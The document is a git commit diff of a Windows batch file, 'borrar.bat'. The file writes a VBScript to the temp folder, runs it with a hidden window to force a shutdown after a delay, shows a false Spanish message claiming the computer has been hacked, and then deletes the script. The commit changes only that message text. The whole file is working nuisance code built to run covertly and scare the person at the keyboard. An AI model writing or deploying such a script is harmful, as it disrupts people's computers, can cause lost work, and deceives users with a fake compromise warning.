2c9c54ee9cb2adf4db3309c7982d62d711926277
jpdelmuro <125717750+jpdelmuro@users.noreply.github.com>
2024-01-14 15:23:24 -0600

    borrar.bat

--- borrar.bat
+++ borrar.bat
@@ -1,5 +1,5 @@
 @echo off
 echo Set objShell = WScript.CreateObject("WScript.Shell") > %temp%\Invisible.vbs
-echo objShell.Run "cmd /c timeout /nobreak /t 60 >nul && shutdown -s -t 30 -c ""Esta computadora ha sido hackeada, se apagará en 10 segundos.""", 0, false >> %temp%\Invisible.vbs
+echo objShell.Run "cmd /c timeout /nobreak /t 60 >nul && shutdown -s -t 30 -c ""Esta computadora ha sido hackeada, se va a apagar en 30 segundos.""", 0, false >> %temp%\Invisible.vbs
 wscript.exe %temp%\Invisible.vbs
 del %temp%\Invisible.vbs
